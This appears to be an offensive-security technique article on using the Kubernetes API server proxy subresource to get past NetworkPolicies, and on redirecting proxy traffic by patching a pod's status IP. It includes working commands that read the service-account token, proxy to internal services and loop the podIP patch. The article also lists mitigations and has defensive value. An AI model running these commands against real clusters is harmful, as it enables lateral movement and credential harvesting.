---
title: Abusing Kubernetes API Server Proxy
description: Bypassing network policies and accessing internal services through the Kubernetes API server proxy subresource
category: offensive
phase: lateral-movement
createdAt: 2026-05-02
impact: An attacker with access to the services/proxy subresource can use the API server as a proxy to reach any internal service, bypassing NetworkPolicies, firewall rules, and network segmentation. This enables lateral movement to services that are not externally accessible and credential harvesting from internal APIs
mitigation:
  - Restrict `create` and `get` on `services/proxy` to only users and service accounts that require debugging access
  - Implement NetworkPolicies that restrict pod-to-API-server communication for namespaces that do not require it
mitreTechniques:
  - T1046
  - T1090
  - T1021
tools:
  - kubectl
  - curl
references: |
  - [Services Proxy API](https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.30/#connect-get-serviceproxy)
  - [Kubernetes API Server Proxy](https://kubernetes.io/docs/tasks/access-application-cluster/access-cluster/#using-kubectl-proxy)
  - [NetworkPolicy Limitations](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
  - [Abusing Kubernetes API server proxying](https://kinvolk.io/blog/2019/02/abusing-kubernetes-apiserver-proxying)
  - [PR #71980: Disable proxy to loopback and linklocal](https://github.com/kubernetes/kubernetes/pull/71980)
---

The Kubernetes API server provides a proxy subresource for Services and Pods that allows authenticated users to make HTTP requests to any in-cluster endpoint through the API server. The API server forwards the request to the service's endpoints or pod IP and returns the response. This feature is designed for debugging and administrative access to internal services without requiring external exposure.

The critical security implication is that **the API server makes the request on behalf of the user**. NetworkPolicies that restrict pod-to-pod communication do not apply to traffic originating from the API server. This means an attacker can reach any service in the cluster, regardless of network segmentation, as long as they have `services/proxy` or `pods/proxy` access.

## RBAC permissions

The minimum RBAC required to trigger this technique:

```yaml
rules:
  - apiGroups: [""]
    resources: ["services/proxy"]
    verbs: ["create", "get"]
```

Or for pod-level proxy access:

```yaml
rules:
  - apiGroups: [""]
    resources: ["pods/proxy"]
    verbs: ["create", "get"]
```

These permissions are sometimes granted alongside `services/get` or `pods/get` for debugging purposes, without operators realizing that the proxy subresource enables full HTTP access to the target.

## The attack sequence

### Step 1: Discover available services

The attacker needs service names and ports to construct proxy URLs. There are two discovery paths:

- **Via Prometheus (silent, no API calls)**. If Prometheus with kube-state-metrics is accessible, the attacker queries `kube_service_info` to get every service name and cluster IP across all namespaces without touching the Kubernetes API:

  ```bash
  curl -s "http://prometheus-server.monitoring.svc.cluster.local/api/v1/query?query=kube_service_info" \
    | jq '.data.result[] | {namespace: .metric.namespace, service: .metric.service, cluster_ip: .metric.cluster_ip}'
  ```

  ```output
  { "namespace": "monitoring", "service": "grafana-svc",   "cluster_ip": "10.96.12.89"  }
  { "namespace": "kube-system","service": "kube-dns",      "cluster_ip": "10.96.0.10"   }
  { "namespace": "default",    "service": "kubernetes",    "cluster_ip": "10.96.0.1"    }
  ```

  See [Cluster Reconnaissance via Prometheus](/topics/cluster-reconnaissance-via-prometheus) for the full technique.

- **Via environment variables and DNS**. Kubernetes injects `<NAME>_SERVICE_HOST` and `<NAME>_SERVICE_PORT` for every service in the same namespace. Cross-namespace services follow a predictable DNS pattern (`<name>.<namespace>.svc.cluster.local`). See [Internal Cluster Discovery](/topics/internal-cluster-discovery).

### Step 2: Verify NetworkPolicy isolation

Before using the proxy, the attacker confirms that direct access to the target service is blocked by NetworkPolicies. From inside a pod in the `production` namespace:

```bash
curl -s --connect-timeout 3 http://grafana-svc.monitoring.svc.cluster.local:3000/api/health
```

```output
command terminated with exit code 28
```

Exit code 28 is curl's connection timeout. The NetworkPolicy blocks pod-to-pod traffic from `production` to `monitoring`. Direct access fails.

### Step 3: Proxy to internal services

The attacker uses the API server proxy to reach services that are not accessible from their pod due to NetworkPolicies. The proxy URL format is:

```
/api/v1/namespaces/<namespace>/services/<name>:<port>/proxy/<path>
```

Access the Grafana dashboard through the proxy from inside the compromised pod:

```bash
APISERVER="https://${KUBERNETES_SERVICE_HOST}:${KUBERNETES_SERVICE_PORT}"
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -sk \
  -H "Authorization: Bearer $TOKEN" \
  --cacert "$CACERT" \
  "$APISERVER/api/v1/namespaces/monitoring/services/grafana-svc:3000/proxy/api/health"
```

```output
{
  "database": "ok",
  "version": "13.0.1",
  "commit": "a100054f"
}
```

The API server forwards the request to the Grafana service and returns the response. NetworkPolicies that block pod-to-pod traffic to the `monitoring` namespace do not apply because the request originates from the API server.

## Proxy URL format variations

The API server supports multiple proxy URL formats. The base path `/api/v1/` is common to all:

| Suffix | Target | Use case |
|---|---|---|
| `namespaces/<ns>/services/<name>:<port>/proxy/<path>` | Service by name and port | HTTP services |
| `namespaces/<ns>/services/<name>/proxy/<path>` | Service by name (uses first port) | Single-port services |
| `namespaces/<ns>/services/http:<name>:<port>/proxy/<path>` | Service with explicit HTTP scheme | HTTP/HTTPS disambiguation |
| `namespaces/<ns>/services/https:<name>:<port>/proxy/<path>` | Service with HTTPS scheme | TLS-terminated services |
| `namespaces/<ns>/pods/<name>:<port>/proxy/<path>` | Pod by name and port | Direct pod access |
| `proxy/namespaces/<ns>/services/<name>:<port>/<path>` | Legacy format (deprecated) | Backward compatibility |

The scheme prefix (`http:` or `https:`) controls whether the API server uses plain HTTP or TLS when connecting to the backend. If omitted, the API server defaults to HTTP.

### Port resolution behavior

When the port is omitted from the proxy URL, the API server selects the first port from the Service spec. If the Service defines multiple ports, the attacker must specify the port explicitly to target a specific backend. First, check the available ports:

```bash
kubectl get svc elasticsearch -o jsonpath='{.spec.ports[*].port}'
```

```output
9200 9300
```

Then proxy to each port explicitly. Omitting the port uses the first one (9200), while appending the port number targets the transport port (9300):

```bash
curl "$APISERVER/api/v1/namespaces/default/services/elasticsearch/proxy/"

curl "$APISERVER/api/v1/namespaces/default/services/elasticsearch:9300/proxy/"
```

### Named port resolution

Services can define named ports. The API server resolves named ports to their numeric values before proxying:

```yaml
spec:
  ports:
    - name: http
      port: 8080
      targetPort: 8080
    - name: metrics
      port: 9090
      targetPort: 9090
```

```bash
curl "$APISERVER/api/v1/namespaces/default/services/my-svc:http/proxy/"
```

The API server resolves `http` to `8080` and proxies to that port.

## Pod Status IP Manipulation

The API server proxy can also be abused as an open HTTP proxy by manipulating pod status. The API server resolves proxy requests by looking up the pod's `status.podIP` field. If an attacker can patch the pod status to change `podIP` to an external IP address, the API server will proxy requests to that external IP instead of the real pod.

### The attack

An attacker with `pods/status` patch permission can redirect proxy traffic to any external IP. First, they resolve the target domain to an IP address:

```bash
nslookup httpbin.org 2>/dev/null | grep "Address:" | tail -1 | awk '{print $2}'
```

```output
203.0.113.50
```

Then patch the pod's `status.podIP` to the external IP:

```bash
kubectl patch pod api-server -n production --type merge --subresource status \
  -p '{"status":{"podIP":"203.0.113.50"}}'
```

When a user accesses the pod through the proxy, the API server resolves the endpoint from the patched status and forwards the request to the external IP:

```bash
kubectl proxy --port=8001 &
curl -s --connect-timeout 5 http://localhost:8001/api/v1/namespaces/production/pods/api-server:80/proxy/get
```

```output
{
  "args": {},
  "headers": {
    "Host": "httpbin.org",
    "X-Forwarded-For": "127.0.0.1, 172.18.0.1, 126.65.200.99"
  },
  "origin": "127.0.0.1, 172.18.0.1, 126.65.200.99",
  "url": "https://httpbin.org/get"
}
```

The response confirms the request reached `httpbin.org` (203.0.113.50), not the original pod. The API server acted as an open HTTP proxy to an external endpoint.

### IP validation in the proxy path

Kubernetes includes IP validation in the pod proxy resolution path. The `ResourceLocation` function in `pkg/registry/core/pod/strategy.go` validates the pod IP before establishing a proxy connection:

```go
if ip := netutils.ParseIPSloppy(podIP); ip == nil || !ip.IsGlobalUnicast() {
    return nil, nil, errors.NewBadRequest("address not allowed")
}
```

Go's `IsGlobalUnicast()` returns `false` for loopback (`127.0.0.0/8`), link-local (`169.254.0.0/16`), multicast, and unspecified addresses. It returns `true` for private IPs (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`) and public IPs. This means the validation blocks access to cloud metadata endpoints and loopback services, but allows proxying to any other address including external public IPs.

The service proxy subresource (`services/proxy`) follows a different resolution path. It reads from the Endpoints object, which is populated by the endpoint controller from actual pod IPs. This path is not affected by the `IsGlobalUnicast` check since the endpoint controller only populates valid pod IPs.

### Two layers of IP validation

There are two separate validation checks that affect this technique:

- **Layer 1: Pod status update validation**. Rejects non-IP values when patching `status.podIP`. This validation has existed since early Kubernetes versions and runs in the pod status update strategy:

  ```bash
  kubectl patch pod api-server -n production --type merge --subresource status \
    -p '{"status":{"podIP":"httpbin.org"}}'
  ```

  ```output
  The Pod "api-server" is invalid: status.podIPs[0]: Invalid value: "httpbin.org": must be a valid IP address, (e.g. 10.9.8.7 or 2001:db8::ffff)
  ```

  This check uses Go's `net.ParseIP` and only ensures the value is a syntactically valid IP. It does **not** restrict which IP addresses are allowed.

- **Layer 2: Proxy path validation**. Added in Kubernetes 1.13 via [PR #71980](https://github.com/kubernetes/kubernetes/pull/71980). When the API server resolves a `pods/proxy` request, the `ResourceLocation` function in `pkg/registry/core/pod/strategy.go` runs an additional check:

  ```go
  if ip := netutils.ParseIPSloppy(podIP); ip == nil || !ip.IsGlobalUnicast() {
      return nil, nil, errors.NewBadRequest("address not allowed")
  }
  ```

  Go's `IsGlobalUnicast()` returns `false` for:
  - Loopback (`127.0.0.0/8`, `::1`)
  - Link-local (`169.254.0.0/16`, `fe80::/10`)
  - Multicast (`224.0.0.0/4`, `ff00::/8`)
  - Unspecified (`0.0.0.0`, `::`)

  It returns `true` for:
  - Private RFC1918 ranges (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`)
  - All public IPs

  **Result**: Layer 2 blocks access to cloud metadata endpoints (`169.254.169.254`) and loopback services, but allows proxying to any private or public IP address. An attacker can still redirect proxy traffic to external IPs.

### Kubelet reconciliation

The kubelet continuously reconciles pod status and will overwrite the patched `podIP` with the real value. Subsequent patch attempts show no change because the kubelet already restored the original IP.

To maintain the redirect, the attacker must run a continuous patch loop:

```bash
while true; do
  kubectl patch pod api-server -n production --type merge --subresource status \
    -p '{"status":{"podIP":"203.0.113.50"}}' 2>/dev/null
  sleep 0.5
done
```

### Why services/proxy is not affected

The `services/proxy` subresource resolves targets from the Endpoints object, not from `status.podIP`. The Endpoints object is managed by the endpoint controller, which watches Service and Pod objects and populates endpoint addresses from `status.podIP` of matching pods. An attacker cannot directly patch the Endpoints object to include external IPs because:

1. The `endpoints` resource requires separate RBAC permissions
2. The endpoint controller continuously reconciles and overwrites manual changes
3. The endpoint controller only includes IPs from pods that match the Service's selector

This means the pod status manipulation technique only works with `pods/proxy`, not with `services/proxy`.

## Proxy transport layer

The API server proxy uses standard HTTP transport for forwarding requests. The connection to the backend is established using Go's `net/http` package with the following behavior:

### HTTP vs HTTPS proxying

When the API server proxies to a backend, it uses the scheme specified in the proxy URL or defaults to HTTP:

- `http:<name>:<port>`. The API server connects via plain HTTP
- `https:<name>:<port>`. The API server connects via HTTPS and validates the backend's TLS certificate
- `<name>:<port>` (no scheme). The API server defaults to HTTP

When proxying to HTTPS backends, the API server uses the cluster's CA bundle to validate the backend's certificate. If the backend uses a self-signed certificate, the proxy request fails with a TLS verification error unless the backend's CA is added to the API server's trust store.

### Request header forwarding

The API server forwards most request headers to the backend, with the following exceptions:

- `Authorization`. Stripped. The backend does not receive the user's API server token
- `Impersonate-*`. Stripped. Impersonation headers are not forwarded to the backend
- `Host`. Rewritten to the backend's address

The `X-Forwarded-For` header is added by the API server to indicate the original client's IP address. However, when the API server is running on a control plane node, this IP is the API server's own IP, not the user's pod IP.

## Why this works

NetworkPolicies only control traffic between pods. The API server runs on the control plane, outside the pod network. When the API server proxies a request, the traffic comes from the control plane IP. The CNI plugin treats this as control plane traffic and does not apply NetworkPolicy rules.

This means:
- NetworkPolicies that restrict access to a service do not block proxy requests
- Services that rely on IP-based allowlists see the API server's IP, which is always allowed
- Internal services that skip authentication because they assume only trusted pods can reach them are fully accessible
- The API server can be used as an open HTTP proxy to external endpoints if pod status is manipulated
